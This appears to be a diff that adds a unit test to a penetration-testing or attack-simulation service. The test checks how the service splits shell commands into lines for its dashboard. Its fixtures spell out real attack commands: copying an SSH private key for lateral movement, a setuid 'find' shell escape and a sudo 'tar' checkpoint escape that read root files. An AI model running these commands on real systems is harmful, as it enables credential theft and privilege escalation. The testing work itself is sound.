@@ -721,5 +721,48 @@ def test_telemetry_is_not_fabricated():
             telemetry = step["evidence"]["telemetry"]
             assert "not captured" in telemetry, telemetry
 
+
+def test_verifier_commands_split_into_shell_lines():
+    """The dashboard shows each step's real command one statement per line.
+
+    The payloads are the ones the adapters actually build (lateral_ssh,
+    config_abuse). The setuid escape is the trap: its `\\;` belongs to
+    `find -exec` and must not end a line, and quoted text must stay whole.
+    """
+    try:
+        import fastapi  # noqa: F401  (main.py imports it)
+    except ImportError:
+        raise Skip("fastapi not installed")
+    sys.path.insert(0, str(ROOT / "service"))
+    from main import _command_lines
+
+    ssh = ("TMPKEY=/tmp/.ascend_abc && cp /var/www/.ssh/id_rsa $TMPKEY 2>/dev/null && "
+           "chmod 600 $TMPKEY 2>/dev/null && ssh -i $TMPKEY -o StrictHostKeyChecking=no "
+           "-o BatchMode=yes -o ConnectTimeout=10 appuser@app01 'whoami' 2>&1; "
+           "RET=$?; rm -f $TMPKEY; exit $RET")
+    assert _command_lines(["sh", "-c", ssh]) == [
+        "TMPKEY=/tmp/.ascend_abc",
+        "cp /var/www/.ssh/id_rsa $TMPKEY 2>/dev/null",
+        "chmod 600 $TMPKEY 2>/dev/null",
+        "ssh -i $TMPKEY -o StrictHostKeyChecking=no -o BatchMode=yes "
+        "-o ConnectTimeout=10 appuser@app01 'whoami' 2>&1",
+        "RET=$?",
+        "rm -f $TMPKEY",
+        "exit $RET",
+    ]
+
+    suid = "/usr/bin/find /etc/hostname -exec /bin/sh -p -c 'cat /root/.ascend_canary' \\; -quit"
+    assert _command_lines(["sh", "-c", suid]) == [suid]
+
+    # A separator inside quotes is not a separator.
+    sudo = ("sudo -n /bin/tar -cf /dev/null /dev/null --checkpoint=1 "
+            "--checkpoint-action=exec='cat /root/.ascend_canary; echo done && true'")
+    assert _command_lines(["sh", "-c", sudo]) == [sudo]
+
+    # Not wrapped in sh -c: shown as one quoted line. Nothing ran: no lines.
+    assert _command_lines(["cat", "/root/my file"]) == ["cat '/root/my file'"]
+    assert _command_lines([]) == []
+    assert _command_lines(None) == []
+
 if __name__ == "__main__":
     sys.exit(main())
